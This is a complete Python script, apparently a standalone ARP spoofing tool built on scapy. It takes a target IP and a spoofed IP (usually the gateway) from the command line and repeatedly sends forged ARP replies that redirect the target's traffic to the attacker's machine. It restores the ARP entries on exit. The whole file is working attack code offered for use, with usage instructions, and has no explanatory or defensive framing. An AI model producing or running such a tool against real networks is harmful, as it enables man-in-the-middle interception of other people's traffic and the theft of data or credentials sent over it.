#!/usr/bin/env python3

import sys
import time
import signal
import threading
from scapy.all import ARP, Ether, sendp, getmacbyip, get_if_hwaddr, conf

spoofer = None

class ARPSpoofer:
    def __init__(self, target_ip, spoof_ip, interface="eth0", interval=2.0):
        self.target_ip = target_ip
        self.spoof_ip = spoof_ip
        self.interface = interface
        self.interval = interval
        
        self.target_mac = None
        self.spoof_mac = None
        self.attacker_mac = None
        
        self.running = False
        self.spoof_thread = None

    def find_mac_addresses(self):
        try:
            self.target_mac = getmacbyip(self.target_ip)
            if not self.target_mac:
                print(f"MAC address not found for {self.target_ip}")
                return False

            self.spoof_mac = getmacbyip(self.spoof_ip)
            if not self.spoof_mac:
                print(f"Mac address not found for {self.spoof_ip}")
                return False

            self.attacker_mac = get_if_hwaddr(self.interface)

            print(f"Network: {self.interface}")
            print(f"Target: {self.target_ip} -> {self.target_mac}")
            print(f"Spoofed IP: {self.spoof_ip} -> {self.spoof_mac}")
            print(f"Attacker MAC: {self.attacker_mac}")

            return True
        except Exception as error:
            print(f"Error looking up MAC {error}")
            return False

    def build_spoof_packet(self):
        return Ether(dst=self.target_mac) / ARP(
            op=2,
            pdst=self.target_ip,
            hwdst=self.target_mac,
            psrc=self.spoof_ip,
            hwsrc=self.attacker_mac
        )

    def build_cleanup_packet(self):
        actual_spoof_mac = self.spoof_mac or getmacbyip(self.spoof_ip)
        return Ether(dst=self.target_mac) / ARP(
            op=2,
            pdst=self.target_ip,
            hwdst=self.target_mac,
            psrc=self.spoof_ip,
            hwsrc=actual_spoof_mac
        )

    def run_spoofing(self):
        packet = self.build_spoof_packet()
        print(f"ARP spoofing beginning, telling {self.target_ip} that {self.spoof_ip} is at {self.attacker_mac}")
        while self.running:
            try:
                sendp(packet, verbose=False, iface=self.interface)
                time.sleep(self.interval)
            except Exception as error:
                print(f"Packet sending error: {error}")
                break

    def begin_attack(self):
        if not self.find_mac_addresses():
            return False
        self.running = True
        self.spoof_thread = threading.Thread(target=self.run_spoofing, daemon=True)
        self.spoof_thread.start()
        return True

    def cleanup_arp(self):
        print("Cleaning up entries")
        try:
            cleanup_packet = self.build_cleanup_packet()
            for i in range(5):
                sendp(cleanup_packet, verbose=False, iface=self.interface)
                time.sleep(0.5)
            print("ARP tables restores")
        except Exception as error:
            print(f"Cleanup failed: {error}")

    def end_attack(self):
        if self.running:
            self.running = False
            if self.spoof_thread:
                self.spoof_thread.join(timeout=3)
        self.cleanup_arp()

def handle_interrupt(signal_number, frame):
    print("\nStopping Attack")
    if spoofer:
        spoofer.end_attack()
    sys.exit(0)

def show_help():
    print("ARP Spoofing Tool")
    print("Usage: sudo python3 arp_spoof.py <target_ip> <spoof_ip> [interface]")
    print("Example: sudo python3 arp_spoof.py 192.168.1.100 192.168.1.1 eth0")

if __name__ == "__main__":
    signal.signal(signal.SIGINT, handle_interrupt)
    
    if len(sys.argv) not in [3, 4]:
        show_help()
        sys.exit(1)

    target = sys.argv[1]
    spoof = sys.argv[2]
    iface = sys.argv[3] if len(sys.argv) == 4 else "eth0"

    print("ARP Spoofing attack starting")

    spoofer = ARPSpoofer(target, spoof, interface=iface)

    if spoofer.begin_attack():
        print("ARP Spoofing is active, to terminate press Ctrl+C")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            pass
        finally:
            spoofer.end_attack()
    else:
        print("Unable to initiate ARP spoofing attack")
        sys.exit(1)
